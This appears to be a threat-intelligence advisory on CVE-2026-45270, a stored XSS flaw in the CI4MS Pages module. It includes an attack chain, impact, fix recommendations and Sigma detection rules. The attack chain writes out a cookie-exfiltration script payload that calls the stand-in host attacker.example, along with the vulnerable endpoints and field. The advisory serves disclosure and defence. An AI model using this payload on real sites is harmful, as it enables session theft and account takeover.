---
title: CI4MS Stored XSS Vulnerability in Pages Module
slug: 2026-05-ci4ms-stored-xss
description: A stored XSS vulnerability (CVE-2026-45270) exists in the Pages module of CI4MS due to improper sanitization of page content, allowing an attacker with `pages.create` permissions to inject malicious code and escalate privileges if an administrator views the page.
date: "2026-05-18T16:24:57Z"
type: threat
types:
  - threat
severities:
  - high
tags:
  - xss
  - stored-xss
  - ci4ms
  - cve-2026-45270
vendors:
  - CodeIgniter
products:
  - ci4-cms-erp/ci4ms (<= 0.31.8.0)
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1190
    technique_name: Exploit Public-Facing Application
  - tactic_id: TA0003
    tactic_name: Persistence
    technique_id: T1059.007
    technique_name: 'Command and Scripting Interpreter: JavaScript'
  - tactic_id: TA0004
    tactic_name: Privilege Escalation
    technique_id: T1068
    technique_name: Exploitation for Privilege Escalation
references:
  - https://github.com/advisories/GHSA-gqr2-7hcg-rchf
  - CVE-2026-45270
iocs:
  - type: url
    value: https://attacker.example/?c=
ioc_counts:
  url: 1
rules:
  - title: Detect CI4MS Pages Module Stored XSS Attempt via HTTP POST
    description: Detects CVE-2026-45270 exploitation — attempts to exploit the CI4MS Pages module stored XSS vulnerability via HTTP POST requests.
    platform: sigma
    severity: high
    tactics:
      - initial_access
    techniques:
      - T1190
    data_sources:
      - webserver
  - title: Detect CI4MS Pages Module Stored XSS Payload in HTTP POST Data
    description: Detects CVE-2026-45270 exploitation — identifies potential stored XSS payloads being submitted to the CI4MS Pages module via HTTP POST requests.
    platform: sigma
    severity: medium
    tactics:
      - initial_access
    techniques:
      - T1190
    data_sources:
      - webserver
rules_count: 2
---

A stored XSS vulnerability exists within the Pages module of the CI4MS application, specifically affecting versions 0.31.8.0 and earlier. This vulnerability arises from the failure to properly sanitize user-supplied content within the Pages module's backend. The `html_purify` validation rule is registered, but the raw, unpurified POST data is directly persisted into the `pages_langs.content` database column. The public renderer for pages emits this unsanitized content without proper escaping, leading to XSS. An attacker with content author privileges (`pages.create`) can inject arbitrary JavaScript code, which executes when a user, including an administrator, views the affected page. Furthermore, pages can be promoted to the site's home page, broadening the attack surface to all visitors.

## Attack Chain

1. An attacker authenticates to the CI4MS backend with `pages.create` or `pages.update` permissions.
2. The attacker crafts a malicious payload containing JavaScript code (e.g., `<script>fetch("https://attacker.example/?c="+encodeURIComponent(document.cookie))</script>`).
3. The attacker creates or updates a page via the `/backend/pages/create` or `/backend/pages/update` endpoints, injecting the malicious payload into the `lang[en][content]` field.
4. The application's `Pages` controller registers the `html_purify` validation rule, but fails to apply the sanitized result to the database.
5. The raw, unsanitized payload is stored in the `pages_langs.content` column in the database.
6. A user visits the public URL of the created page (e.g., `/poc-page-xss`), triggering the `Home::index()` controller.
7. The `Home::index()` controller retrieves the unsanitized content from the database.
8. The template at `app/Views/templates/default/pages.php` emits the raw content via `<?php echo $pageInfo->content ?>` without escaping, causing the JavaScript code to execute in the user's browser.

## Impact

Successful exploitation allows an attacker to execute arbitrary JavaScript code in the browser of any visitor to the compromised page. If an administrator visits the page, their session cookie can be exfiltrated, leading to complete account takeover. The attacker requires only `pages.create` permissions, which are typically assigned to non-admin content authors, enabling privilege escalation. By setting the malicious page as the home page, the attacker can ensure that every visitor to the site is potentially compromised.

## Recommendation

*   Apply the vendor-provided fix by calling `CustomRules::sanitizeHtml()` before persisting the content in `modules/Pages/Controllers/Pages.php` (see snippet in advisory).
*   Deploy the Sigma rule "Detect CI4MS Pages Module Stored XSS Attempt via HTTP POST" to identify potential exploitation attempts in web server logs.
*   Review and update other modules using the `html_purify` validation rule to ensure proper sanitization.
*   Enable output escaping for fields not intended to contain raw HTML to provide defense-in-depth.
*   Monitor web server logs for requests to `/backend/pages/create` and `/backend/pages/update` with suspicious content in the `lang[en][content]` parameter using the Sigma rule "Detect CI4MS Pages Module Stored XSS Payload in HTTP POST Data".
